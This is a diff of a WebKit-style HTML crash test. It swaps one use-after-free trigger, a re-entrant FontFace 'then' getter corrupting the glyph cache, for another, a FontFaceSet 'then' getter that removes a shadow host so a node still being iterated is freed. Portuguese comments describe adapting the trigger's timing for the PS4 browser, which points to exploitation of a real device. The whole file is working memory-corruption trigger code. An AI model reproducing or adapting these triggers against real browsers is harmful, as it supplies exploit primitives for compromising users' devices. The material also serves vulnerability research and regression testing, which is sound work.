@@ -1,71 +1,86 @@
+
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"></head>
 <body>
 <script>
-// FontCascade::width holds a raw pointer into FontCascadeFonts::m_glyphGeometryCache's bucket
-// array across the measurement call it makes right after. That call can realize a pending
-// FontFace with a local() source, which loads synchronously and resolves the FontFace loaded
-// promise inline, running an author `then` getter mid-width(). The getter re-enters measureText
-// on the same context, inserting into the same cache until it rehashes and frees the bucket
-// array the outer frame's pointer still points into.
+// Baseado no original 03.html (commit 86074ba)
+// Alteracoes minimas confirmadas para PS4:
+//   1. Execucao inline em vez de window.load+setTimeout
+//      (async completedLoading() dispara via JSPromise::resolve() nesse timing)
+//   2. Data URL longa em vez de arquivo externo
+//      (evita 404 imediato; fonte fica "loading" durante toda execucao sincrona)
+//   3. Getter instalado ANTES do shadowRoot.prepend()
+//      (no PS4 o flush síncrono ocorre durante o prepend; getter precisa estar no lugar)
+//
+// Tudo mais mantido identico ao original.
 
+// Touch document.fonts before the load event so that FontFaceSet is marked as
+// document-loaded; completedLoading() only settles the ready promise in that state.
+document.fonts;
 
-
-let ctx = null;
-let inGetter = false;
-
-Object.defineProperty(FontFace.prototype, 'then', {
-    configurable: true,
-    get() {
-        if (inGetter || !ctx)
-            return undefined;
-        inGetter = true;
-        for (let i = 0; i < 16; i++) {
-            try { ctx.measureText('q' + String.fromCharCode(65 + i) + 'z'); } catch (e) { }
-            try { ctx.measureText('x'); } catch (e) { }
-        }
-        inGetter = false;
-        return undefined;
-    }
-});
-
-function attempt(n)
-{
-    for (let d = 0; d < 3; d++)
-        new FontFace('Dummy' + n + '_' + d, 'local(Helvetica)');
-
-    const family = 'VarFam' + n;
-    const face = new FontFace(family, 'local(Helvetica)');
-    void face.loaded;
-    document.fonts.add(face);
-
-    const canvas = document.createElement('canvas');
-
-    canvas.width = 10;
-
-    canvas.height = 10;
-
-    const ctx = canvas.getContext('2d');
-
-    ctx.font = '20px Helvetica, ' + family;
-
-    for (let i = 0; i < 50; i++)
-        ctx.measureText('x');
-
-    // U+E005 is absent from Helvetica, so this walks the fallback list into the pending face.
-    ctx.measureText('?AB');
+function log(message) {
+    document.body.appendChild(document.createTextNode(message));
+    document.body.appendChild(document.createElement("br"));
 }
 
-window.onload = function () {
-    setTimeout(function () {
-        for (let n = 0; n < 3; n++) {
-            try { attempt(n); } catch (e) { }
-        }
-        document.body.appendChild(document.createTextNode("PASS if no crash"));
+// ALTERACAO 1: sem window.load+setTimeout — executa inline
+// (o diagnostico_86074ba provou que esse timing dispara o getter via JSPromise path)
+(function run() {
+    const host = document.createElement("div");
+    document.body.appendChild(host);
+    const shadowRoot = host.attachShadow({ mode: "open" });
 
-    }, 0);
-};
+    // ALTERACAO 2: data URL longa em vez de "resources/no-such-font-for-reentry.otf"
+    // A data URL mantem a fonte em "loading" durante a execucao sincrona
+    // e falha como macrotask (via JSPromise path) em vez de 404 imediato
+    const dataUrl = "data:font/otf;base64," + "A".repeat(150000);
+
+    const fontFaceStyle = document.createElement("style");
+    fontFaceStyle.textContent =
+        `@font-face { font-family: reentryFont; src: url("${dataUrl}"); }` +
+        `.probe { font: 24px reentryFont; }`;
+    shadowRoot.appendChild(fontFaceStyle);
+
+    const probe = document.createElement("span");
+    probe.className = "probe";
+    probe.textContent = "A";
+    shadowRoot.appendChild(probe);
+
+    document.body.offsetHeight; // Force layout so the font load starts.
+    document.fonts.load("24px reentryFont", "A");
+    log("document.fonts.status: " + document.fonts.status);
+
+    // Materialize the JS promise for the ready proxy that startedLoading() re-armed,
+    // so that settling it goes through JSPromise::resolve() and its thenable check.
+    document.fonts.ready;
+
+    // ALTERACAO 3: getter instalado ANTES do prepend
+    // No PS4, prepend() dispara flushPendingDescendantUpdates() sincronamente
+    // O getter precisa estar instalado antes disso
+    let getterCallCount = 0;
+    Object.defineProperty(FontFaceSet.prototype, "then", {
+        configurable: true,
+        get() {
+            delete FontFaceSet.prototype.then;
+            ++getterCallCount;
+            host.remove(); // Frees the iterated Document::m_inDocumentShadowRoots node.
+            return undefined;
+        }
+    });
+
+    // Give the shadow scope a pending UpdateType::ActiveSet whose flush takes the
+    // ResolverUpdateType::Reset path, so all of its sheets (including the @font-face
+    // one) get re-processed. Prepending rather than appending is what makes
+    // analyzeStyleSheetChange() pick Reset.
+    const prependedStyle = document.createElement("style");
+    prependedStyle.textContent = ".unused { color: red; }";
+    shadowRoot.prepend(prependedStyle);
+
+    document.styleSheets.length; // Reaches Scope::flushPendingDescendantUpdates().
+
+    log("FontFaceSet.prototype.then getter calls: " + getterCallCount);
+    log("PASS if no crash.");
+})();
 </script>
 </body>
 </html>
